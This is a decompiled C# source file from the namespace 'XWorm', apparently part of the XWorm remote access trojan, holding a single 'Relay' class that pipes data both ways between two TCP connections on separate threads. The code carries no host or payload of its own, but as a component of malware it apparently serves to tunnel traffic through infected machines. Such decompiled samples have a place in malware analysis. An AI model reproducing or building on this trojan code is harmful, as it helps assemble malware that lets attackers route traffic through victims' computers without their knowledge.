using System;
using System.Net.Sockets;
using System.Threading;

namespace XWorm
{
	// Token: 0x0200003C RID: 60
	internal class Relay
	{
		// Token: 0x060009F8 RID: 2552 RVA: 0x000582C8 File Offset: 0x000564C8
		public void method_0(TcpClient tcpClient_2, TcpClient tcpClient_3)
		{
			this.tcpClient_0 = tcpClient_2;
			this.tcpClient_1 = tcpClient_3;
			this.networkStream_0 = tcpClient_2.GetStream();
			this.networkStream_1 = tcpClient_3.GetStream();
			Relay.thread = new Thread(new ThreadStart(this.method_1));
			Relay.thread2 = new Thread(new ThreadStart(this.method_2));
			Relay.thread.Start();
			Relay.thread2.Start();
		}

		// Token: 0x060009F9 RID: 2553 RVA: 0x00058340 File Offset: 0x00056540
		public static void Close()
		{
			try
			{
				Thread thread = Relay.thread;
				if (thread != null)
				{
					thread.Abort();
				}
				Thread thread2 = Relay.thread2;
				if (thread2 != null)
				{
					thread2.Abort();
				}
			}
			catch (Exception ex)
			{
			}
		}

		// Token: 0x060009FA RID: 2554 RVA: 0x00058394 File Offset: 0x00056594
		private void method_1()
		{
			try
			{
				byte[] array = new byte[24577];
				for (;;)
				{
					int num = this.networkStream_0.Read(array, 0, array.Length);
					bool flag = num == 0;
					if (flag)
					{
						break;
					}
					this.networkStream_1.Write(array, 0, num);
					this.networkStream_1.Flush();
				}
				this.networkStream_0.Close();
				this.tcpClient_0.Close();
				this.tcpClient_1.Close();
				this.networkStream_1.Close();
			}
			catch (Exception ex)
			{
				this.tcpClient_0.Close();
				this.tcpClient_1.Close();
			}
		}

		// Token: 0x060009FB RID: 2555 RVA: 0x00058458 File Offset: 0x00056658
		private void method_2()
		{
			try
			{
				byte[] array = new byte[24577];
				for (;;)
				{
					int num = this.networkStream_1.Read(array, 0, array.Length);
					bool flag = num == 0;
					if (flag)
					{
						break;
					}
					this.networkStream_0.Write(array, 0, num);
					this.networkStream_0.Flush();
				}
				this.networkStream_0.Close();
				this.tcpClient_0.Close();
				this.tcpClient_1.Close();
				this.networkStream_1.Close();
			}
			catch (Exception ex)
			{
				this.tcpClient_0.Close();
				this.tcpClient_1.Close();
			}
		}

		// Token: 0x04000428 RID: 1064
		private static Thread thread;

		// Token: 0x04000429 RID: 1065
		private static Thread thread2;

		// Token: 0x0400042A RID: 1066
		private TcpClient tcpClient_0;

		// Token: 0x0400042B RID: 1067
		private TcpClient tcpClient_1;

		// Token: 0x0400042C RID: 1068
		private NetworkStream networkStream_0;

		// Token: 0x0400042D RID: 1069
		private NetworkStream networkStream_1;
	}
}
